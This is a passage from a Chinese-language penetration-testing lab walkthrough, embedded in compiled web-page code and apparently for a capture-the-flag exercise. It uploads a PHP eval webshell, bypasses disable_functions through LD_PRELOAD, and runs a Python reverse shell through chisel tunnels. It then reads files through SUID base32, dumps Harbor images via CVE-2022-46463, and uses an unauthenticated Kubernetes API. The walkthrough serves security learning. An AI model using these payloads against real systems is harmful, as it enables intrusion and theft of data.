Chrome/126.0.6478.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 40\n\nimgbase64=data:image/png;base64,dGVzdA==\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(60979).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5bb9\u786e\u5b9e\u4e3a ",(0,s.jsx)(e.code,{children:"test"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ proxychains4 http get 172.28.23.26/upload/2024-08-16-66bef298cdc19.png\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10000  ...  172.28.23.26:80  ...  OK\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: Keep-Alive\nContent-Length: 4\nContent-Type: image/png\nDate: Fri, 16 Aug 2024 06:33:27 GMT\nETag: "4-61fc7213ca6b0"\nKeep-Alive: timeout=5, max=100\nLast-Modified: Fri, 16 Aug 2024 06:32:56 GMT\nServer: Apache/2.4.18 (Ubuntu)\n\ntest\n'})}),"\n",(0,s.jsx)(e.h2,{id:"172282326-webshell",children:"172.28.23.26 webshell"}),"\n",(0,s.jsx)(e.p,{children:"\u7ed3\u5408\u53d1\u73b0\u7684\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u76f4\u63a5\u90e8\u7f72 webshell"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"POST /uploadbase64.php HTTP/1.1\nHost: 172.28.23.26\nAccept-Language: zh-CN\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 76\n\nimgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydzaGVsbCddKSA/Pg==\n"})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(15229).Z+"",width:"2378",height:"1390"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fde\u63a5"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(4395).Z+"",width:"1545",height:"1044"})}),"\n",(0,s.jsxs)(e.p,{children:["\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fdc\u7a0b\u9776\u673a\u4e0a\u5b58\u5728\u6709 ",(0,s.jsx)(e.code,{children:"disable_functions"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(33027).Z+"",width:"1545",height:"1044"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7ecf\u8fc7\u6d4b\u8bd5\u548c\u6392\u9664\uff0c\u53ef\u4ee5\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"LD_proload"})," \u8fdb\u884c\u7ed5\u8fc7"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(98581).Z+"",width:"1545",height:"1044"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6267\u884c\u6210\u529f\u540e\uff0c\u5c06\u751f\u6210 ",(0,s.jsx)(e.code,{children:"/tmp/.98630ant_x64.so"})," \u548c ",(0,s.jsx)(e.code,{children:"/var/www/html/OAsystem/upload/.antproxy.php"})]}),"\n",(0,s.jsxs)(e.p,{children:["\u624b\u52a8\u521b\u5efa ",(0,s.jsx)(e.code,{children:"/var/www/html/OAsystem/upload/shell-get.php"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-php",metastring:'title="shell-get.php"',children:"<?php @eval($_GET_['a']) ?>\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7136\u540e\u4fee\u6539 ",(0,s.jsx)(e.code,{children:"/var/www/html/OAsystem/upload/.antproxy.php"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"img",src:a(36692).Z+"",width:"1545",height:"1044"})}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u5229\u7528"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd=whoami\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10000  ...  172.28.23.26:80  ...  OK\nHTTP/1.1 200 OK\nConnection: Keep-Alive\nContent-Length: 9\nContent-Type: text/html; charset=UTF-8\nDate: Fri, 16 Aug 2024 06:55:56 GMT\nKeep-Alive: timeout=5, max=100\nServer: Apache/2.4.18 (Ubuntu)\n\nwww-data\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u90e8\u7f72\u4e86 webshell"}),"\n",(0,s.jsx)(e.h2,{id:"172282326-\u53cd\u5f39-shell",children:"172.28.23.26 \u53cd\u5f39 shell"}),"\n",(0,s.jsxs)(e.p,{children:["\u7531\u4e8e ",(0,s.jsx)(e.code,{children:"172.28.23.0/24"})," \u8fd9\u4e2a\u5185\u7f51\u6ca1\u6709\u51fa\u7f51\u7684\u80fd\u529b\uff0c\u6240\u4ee5\u9700\u8981\u5c06 vps \u4e0a\u7684\u76d1\u542c\u5668\u7aef\u53e3\u8f6c\u53d1\u5230 ",(0,s.jsx)(e.code,{children:"172.28.23.17 (\u5165\u53e3\u70b9)"})," \u4e0a\uff0c\u4ee5\u4fbf\u4e8e\u5185\u7f51\u9776\u673a\u7684\u53cd\u5f39 shell"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="172.28.23.17"',children:"(remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 9999:9999 &\n2024/08/16 15:00:55 client: Connecting to ws://139.*.*.*:1337\n2024/08/16 15:00:55 client: tun: proxy#9999=>9999: Listening\n2024/08/16 15:00:55 client: Connected (Latency 51.273631ms)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u501f\u52a9\u5728 OA \u7cfb\u7edf\u4e0a\u90e8\u7f72\u7684 webshell \u6765\u6267\u884c\u53cd\u5f39 shell"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ proxychains4 http get http://172.28.23.26/upload/.antproxy.php?cmd=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22172.28.23.17%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u6536\u5230\u53cd\u8fde shell"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"(remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ whoami\nwww-data\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172282326-suid-\u63d0\u6743",children:"172.28.23.26 Suid \u63d0\u6743"}),"\n",(0,s.jsx)(e.p,{children:"\u5c1d\u8bd5\u626b\u63cf suid \u7279\u6743\u6587\u4ef6\uff0c\u53d1\u73b0"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"(remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ find / -perm -u=s -type f 2>/dev/null\n/bin/fusermount\n/bin/ping6\n/bin/mount\n/bin/su\n/bin/ping\n/bin/umount\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/at\n/usr/bin/staprun\n/usr/bin/base32\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/sudo\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u53ef\u4ee5\u501f\u52a9 ",(0,s.jsx)(e.code,{children:"base32"})," \u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"(remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ base32 /flag02.txt | base32 -d\nflag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"flag---02",children:"flag - 02"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"flag{56d37734-5f73-447f-b1a5-a83f45549b28}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172282326-\u63a2\u6d4b\u73af\u5883",children:"172.28.23.26 \u63a2\u6d4b\u73af\u5883"}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b\u7f51\u5361\u4fe1\u606f\uff0c\u53d1\u73b0\u5b58\u5728\u53cc\u5c42\u5185\u7f51"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"(remote) www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ifconfig\neth0      Link encap:Ethernet  HWaddr 00:16:3e:03:44:3d\n          inet addr:172.28.23.26  Bcast:172.28.255.255  Mask:255.255.0.0\n          inet6 addr: fe80::216:3eff:fe03:443d/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:111561 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:28303 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:119253359 (119.2 MB)  TX bytes:21824361 (21.8 MB)\n\neth1      Link encap:Ethernet  HWaddr 00:16:3e:04:42:65\n          inet addr:172.22.14.6  Bcast:172.22.255.255  Mask:255.255.0.0\n          inet6 addr: fe80::216:3eff:fe04:4265/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:860 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:863 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:37216 (37.2 KB)  TX bytes:37178 (37.1 KB)\n\nlo        Link encap:Local Loopback\n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:65536  Metric:1\n          RX packets:610 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:610 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1\n          RX bytes:57067 (57.0 KB)  TX bytes:57067 (57.0 KB)\n"})}),"\n",(0,s.jsx)(e.h2,{id:"1722214024-\u53cc\u5c42\u5185\u7f51\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd",children:"172.22.14.0/24 \u53cc\u5c42\u5185\u7f51\u5efa\u7acb\u4e2d\u8f6c\u67a2\u7ebd"}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"172.28.23.0/24"})," \u5185\u7f51\u5df2\u7ecf\u5efa\u7acb\u4ee3\u7406\uff0c\u6240\u4ee5\u9700\u8981\u9488\u5bf9\u4e8c\u5c42\u7684 ",(0,s.jsx)(e.code,{children:"172.22.14.0/24"})," \u5efa\u7acb\u4ee3\u7406"]}),"\n",(0,s.jsxs)(e.p,{children:["\u9996\u5148\uff0c\u9700\u8981\u5c06\u516c\u7f51 vps \u7684 chisel \u76d1\u542c\u7aef\u53e3 ",(0,s.jsx)(e.code,{children:"1337"})," \u8f6c\u53d1\u5230\u5185\u7f51 ",(0,s.jsx)(e.code,{children:"172.28.23.17 (\u5165\u53e3\u70b9)"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title=""',children:"(remote) www-data@portal:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 1337:11337 &\n2024/08/16 15:14:59 client: Connecting to ws://139.*.*.*:1337\n2024/08/16 15:14:59 client: tun: proxy#1337=>11337: Listening\n2024/08/16 15:15:00 client: Connected (Latency 43.287612ms)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u5728\u4e00\u5c42\u5185\u7f51\u4e0e\u4e8c\u5c42\u5185\u7f51\u5171\u5728\u7684\u9776\u673a\u4e0a\u5efa\u7acb\u8f6c\u53d1"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="172.28.23.26 & 172.22.14.6"',children:"(remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10001:socks &\n2024/08/16 15:24:51 client: Connecting to ws://172.28.23.17:1337\n2024/08/16 15:24:51 server: session#8: tun: proxy#R:10001=>socks: Listening\n2024/08/16 15:24:51 client: Connected (Latency 47.995041ms)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u6210\u529f\u5efa\u7acb\u4e8c\u5c42\u5185\u7f51\u7684\u4ee3\u7406"}),"\n",(0,s.jsx)(e.h2,{id:"\u5185\u7f51\u626b\u63cf-1722214024",children:"\u5185\u7f51\u626b\u63cf 172.22.14.0/24"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"start ping\n(icmp) Target 172.22.14.6     is alive\n(icmp) Target 172.22.14.37    is alive\n(icmp) Target 172.22.14.46    is alive\n[*] Icmp alive hosts len is: 3\n172.22.14.46:80 open\n172.22.14.46:22 open\n172.22.14.37:22 open\n172.22.14.6:80 open\n172.22.14.6:22 open\n172.22.14.6:21 open\n172.22.14.37:2379 open\n172.22.14.37:10250 open\n[*] alive ports len is: 8\nstart vulscan\n[*] WebTitle: http://172.22.14.6        code:200 len:13693  title: \u65b0\u7fd4 OA \u7ba1\u7406\u7cfb\u7edf - OA \u7ba1\u7406\u5e73\u53f0\u8054\u7cfb\u7535\u8bdd\uff1a13849422648 \u5fae\u4fe1\u540c\u53f7\uff0cQQ958756413\n[*] WebTitle: http://172.22.14.46       code:200 len:785    title:Harbor\n[+] InfoScan:http://172.22.14.46       [Harbor]\n[+] ftp://172.22.14.6:21:anonymous\n   [->]OASystem.zip\n[*] WebTitle: https://172.22.14.37:10250 code:404 len:19     title:None\n[+] http://172.22.14.46/swagger.json poc-yaml-swagger-ui-unauth [{path swagger.json}]\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172221446-harbor-\u955c\u50cf\u6cc4\u9732",children:"172.22.14.46 Harbor \u955c\u50cf\u6cc4\u9732"}),"\n",(0,s.jsxs)(e.p,{children:["\u4f7f\u7528 ",(0,s.jsx)(e.code,{children:"CVE-2022-46463"})," \u6f0f\u6d1e\uff0c\u5c06 Harbor \u4e0a\u7684\u4fe1\u606f\u8fdb\u884c\u83b7\u53d6"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2022-46463]\n\u2514\u2500$ proxychains4 -q python3 harbor.py http://172.22.14.46\n[*] API version used v2.0\n[+] project/projectadmin\n[+] project/portal\n[+] library/nginx\n[+] library/redis\n[+] harbor/secret\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5c06 ",(0,s.jsx)(e.code,{children:"harbor/secret"})," \u8fd9\u4e2a\u955c\u50cf\u83b7\u53d6\u4e0b\u6765\u5206\u6790"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2022-46463]\n\u2514\u2500$ proxychains python3 harbor.py http://172.22.14.46 --dump harbor/secret --v2\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n[+] Dumping : harbor/secret:latest\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : 58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50\n[Errno 1] Operation not permitted\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49\n[proxychains] Strict chain  ...  139.*.*.*:10001  ...  172.22.14.46:80  ...  OK\n    [+] Downloading : 8bd8c9755cbf83773a6a54eff25db438debc22d593699038341b939e73974653\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u5bf9\u955c\u50cf\u8fdb\u884c\u5206\u6790\uff0c\u5728\u5176\u4e2d\u627e\u5230 flag \u6587\u4ef6"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2022-46463/caches/harbor_secret/latest]\n\u2514\u2500$ cat 413e572f115e1674c52e629b3c53a42bf819f98c1dbffadc30bda0a8f39b0e49/f1ag05_Yz1o.txt\nflag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"flag---05",children:"flag - 05"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-plaintext",children:"flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}\n"})}),"\n",(0,s.jsx)(e.h2,{id:"172221437-kubernetes",children:"172.22.14.37 Kubernetes"}),"\n",(0,s.jsx)(e.p,{children:"\u5b58\u5728\u6709 Kubernetes API \u672a\u6388\u6743\uff0c\u5c1d\u8bd5\u8fdb\u884c\u653b\u51fb"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-json",metastring:'title="https://172.22.14.37:6443"',children:'{\n    "paths": [\n        "/api",\n        "/api/v1",\n        "/apis",\n        "/apis/",\n        "/apis/admissionregistration.k8s.io",\n        "/apis/admissionregistration.k8s.io/v1",\n        "/apis/admissionregistration.k8s.io/v1beta1",\n        "/apis/apiextensions.k8s.io",\n        "/apis/apiextensions.k8s.io/v1",\n        "/apis/apiextensions.k8s.io/v1beta1",\n        "/apis/apiregistration.k8s.io",\n        "/apis/apiregistration.k8s.io/v1",\n        "/apis/apiregistration.k8s.io/v1beta1",\n        "/apis/apps",\n        "/apis/apps/v1",\n        "/apis/authentication.k8s.io",\n        "/apis/authentication.k8s.io/v1",\n        "/apis/authentication.k8s.io/v1beta1",\n        "/apis/authorization.k8s.io",\n        "/apis/authorization.k8s.io/v1",\n        "/apis/authorization.k8s.io/v1beta1",\n        "/apis/autoscaling",\n        "/apis/autoscaling/v1",\n        "/apis/autoscaling/v2beta1",\n        "/apis/autoscaling/v2beta2",\n        "/apis/batch",\n        "/apis/batch/v1",\n        "/apis/batch/v1beta1",\n        "/apis/certificates.k8s.io",\n        "/apis/certificates.k8s.io/v1beta1",\n        "/apis/coordination.k8s.io",\n        "/apis/coordination.k8s.io/v1",\n        "/apis/coordination.k8s.io/v1beta1",\n        "/apis/events.k8s.io",\n        "/apis/events.k8s.io/v1beta1",\n        "/apis/extensions",\n        "/apis/extensions/v1beta1",\n        "/apis/networking.k8s.io",\n        "/apis/networking.k8s.io/v1",\n        "/apis/networking.k8s.io/v1beta1",\n        "/apis/node.k8s.io",\n        "/apis/node.k8s.io/v1beta1",\n        "/apis/policy",\n        "/apis/policy/v1beta1",\n        "/apis/rbac.authorization.k8s.io",\n        "/apis/rbac.authorization.k8s.io/v1",\n        "/apis/rbac.authorization.k8s.io/v1beta1",\n        "/apis/scheduling.k8s.io",\n        "/apis/scheduling.k8s.io/v1",\n        "/apis/scheduling.k8s.io/v1beta1",\n        "/apis/storage.k8s.io",\n        "/apis/storage.k8s.io/v1",\n        "/apis/storage.k8s.io/v1beta1",\n        "/healthz",\n        "/healthz/autoregister-completion",\n        "/healthz/etcd",\n        "/healthz/log",\n        "/healthz/ping",\n        "/healthz/poststarthook/apiservice-openapi-controller",\n        "/healthz/poststarthook/apiservice-registration-controller",\n        "/healthz/poststarthook/apiservice-status-available-controller",\n        "/healthz/poststarthook/bootstrap-controller",\n        "/healthz/poststarthook/ca-registration",\n        "/healthz/poststarthook/crd-informer-synced",\n        "/healthz/poststarthook/generic-apiserver-start-informers",\n        "/healthz/poststarthook/kube-apiserver-autoregistration",\n        "/healthz/poststarthook/rbac/bootstrap-roles",\n        "/healthz/poststarthook/scheduling/bootstrap-system-priority-classes",\n        "/healthz/poststarthook/start-apiextensions-controllers",\n        "/healthz/poststarthook/start-apiextensions-informers",\n        "/healthz/poststarthook/start-kube-aggregator-informers",\n        "/healthz/poststarthook/start-kube-apiserver-admission-initializer",\n        "/livez",\n        "/livez/autoregister-completion",\n        "/livez/etcd",\n        "/livez/log",\n        "/livez/ping",\n        "/livez/poststarthook/apiservice-openapi-controller",\n        "/livez/poststarthook/apiservice-registration-controller",\n        "/livez/poststarthook/apiservice-status-available-controller",\n        "/livez/poststarthook/bootstrap-controller",\n        "/livez/poststarthook/ca-registration",\n        "/livez/poststarthook/crd-informer-synced",\n        "/livez/poststarthook/generic-apiserver-start-informers",\n        "/livez/poststarthook/kube-apiserver-autoregistration",\n        "/livez/poststarthook/rbac/bootstrap-roles",\n        "/livez/poststarthook/scheduling/bootstrap-system-priority-classes",\n        "/livez/poststarthook/start-apiextensions-controllers",\n        "/livez/poststarthook/start-apiextensions-informers",\n        "/livez/poststarthook/start-kube-aggregator-informers",\n        "/livez/poststarthook/start-kube-apiserver-admission-initializer",\n        "/logs",\n        "/metrics",\n        "/openapi/v2",\n        "/readyz",\n        "/readyz/autoregister-completion",\n        "/readyz/etcd",\n        "/readyz/log",\n        "/readyz/ping",\n        "/readyz/poststarthook/apiservice-openapi-controller",\n        "/readyz/poststarthook/apiservice-registration-controller",\n        "/readyz/poststarthook/apiservice-status-available-controller",\n        "/readyz/poststarthook/bootstrap-controller",\n        "/readyz/poststarthook/ca-registration",\n        "/readyz/poststarthook/crd-informer-synced",\n        "/readyz/poststarthook/generic-apiserver-start-informers",\n        "/readyz/poststarthook/kube-apiserver-autoregistration",\n        "/readyz/poststarthook/rbac/bootstrap-roles",\n        "/readyz/poststarthook/scheduling/bootstrap-system-priority-classes",\n        "/readyz/poststarthook/start-apiextensions-controllers",\n        "/readyz/poststarthook/start-apiextensions-informers",\n        "/readyz/poststarthook/start-kube-aggregator-informers",\n        "/readyz/poststarthook/start-kube-apiserver-admission-initializer",\n        "/readyz/shutdown",\n        "/version"\n    ]\n}\n'})}),"\n",(0,s.jsx)(e.admonition,{type:"warning",children:(0,s.jsxs)(e.p,{children:["\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e ",(0,s.jsx)(e.code,{children:"kubectl"})," \u81ea\u884c\u8bbe\u8ba1\u4e86\u7f51\u7edc\u4ea4\u4e92\u7684\u903b\u8f91\uff0c\u6240\u4ee5\u6ca1\u529e\u6cd5\u7531 ",(0,s.jsx)(e.code,{children:"proxychains"})," \u6ce8\u5165\u6765\u5b9e\u73b0\u4ee3\u7406\uff0c\u6240\u4ee5\u6bd4\u8f83\u71ac\u597d\u7684\u65b9\u6848\u5c31\u662f\u4f7f\u7528\u7aef\u53e3\u8f6c\u53d1\u5c06 Kubernetes \u7aef\u53e3\u8f6c\u53d1\u51fa\u6765"]})}),"\n",(0,s.jsx)(e.p,{children:"\u9996\u5148\u5148\u8f6c\u53d1\u670d\u52a1"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",metastring:'title="172.22.14.6"',children:"(remote) www-data@ubuntu-oa:/tmp$ ./chisel_1.9.1_linux_amd64 client 172.28.23.17:1337 R:0.0.0.0:10003:172.22.14.37:6443\n2024/08/16 16:25:08 client: Connecting to ws://172.28.23.17:1337\n2024/08/16 16:25:08 server: session#16: tun: proxy#R:10003=>172.22.14.37:6443: Listening\n2024/08/16 16:25:08 client: Connected (Latency 48.219025ms)\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u7136\u540e\u5c1d\u8bd5\u8fde\u63a5 Kubernetes \u670d\u52a1"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools]\n\u2514\u2500$ ./kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ get pods\nPlease enter Username: a\nPlease enter Password: NAME                                READY   STATUS    RESTARTS   AGE\nnginx-deployment-58d48b746d-d6x8t   1/1     Running   3          314d\nnginx-deployment-58d48b746d-pg4gl   1/1     Running   3          314d\nnginx-deployment-58d48b746d-s2vwl   1/1     Running   3          314d\nnginx-deployment-58d48b746d-x26mr   1/1     Running   3          314d\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u67e5\u770b pod \u8d44\u6e90"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tools]\n\u2514\u2500$ ./kubectl --insecure-skip-tls-verify -s https://139.*.*.*:10003/ describe pod nginx-deployment-58d48b746d-d6x8t\nPlease enter Username: a\nPlease enter Password: Name:             nginx-deployment-58d48b746d-d6x8t\nNamespace:        default\nPriority:         0\nService Account:  default\nNode:             ubuntu-k8s/172.22.14.37\nStart Time:       Fri, 06 Oct 2023 20:33:56 +0800\nLabels:           app=nginx\n                  pod-template-hash=58d48b746d\nAnnotations:      <none>\nStatus:           Running\nIP:               10.244.0.36\nIPs:\n  IP:           10.244.0.36\nControlled By:  ReplicaSet/nginx-deployment-58d48b746d\nContainers:\n  nginx:\n    Container ID:   docker://f7dfc9dc10e1efb17150bffcf6c32214cfbe3d360b938ae3ca3252e43b00dced\n    Image:          nginx:1.8\n    Image ID:       docker-pullable://nginx@sha256:c97ee70c4048fe79765f7c2ec0931957c2898f47400128f4f3640d0ae5d60d10\n    Port:           <none>\n    Host Port:      <none>\n    State:          Running\n      Started:      Fri, 16 Aug 2024 13:57:28 +0800\n    Last State:     Terminated\n      Reason:       Completed\n      Exit Code:    0\n      Started:      Mon, 25 Mar 2024 16:55:49 +0800\n      Finished:     Fri, 16 Aug 2024 13:56:04 +0800\n    Ready:          True\n    Restart Count:  3\n    Environment:    <none>\n    Mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-zqldf (ro)\nConditions:\n  Type              Status\n  Initialized       True\n  Ready             True\n  ContainersReady   True\n  PodScheduled      True\nVolumes:\n  default-token-zqldf:\n    Type:        Secret (a volume populated by a Secret)\n    SecretName:  default-token-zqldf\n    Optional:    false\nQoS Class:       BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s\n                 node.kubernetes.io/unreachable:NoExecute op=Exists for 300s\nEvents:          <none>\n"})}),"\n",(0,s.jsx)(e.p,{children:"\u4e8e\u662f\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7f16\u5199\u4e00\u4e2a pod\uff0c\u5c06\u5bbf\u4e3b\u673a\u7684\u6839\u76ee\u5f55\u6620\u5c04\u8fdb\u53bb\u4e4b\u540e\uff0c\u6307\u5b9a ssh \u79c1\u94a5\u5e76\u8fde\u63a5\uff0c\u5373\u53ef\u5bf9\u5bbf\u4e3b\u673a\u5b9e\u73b0 getshell"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ 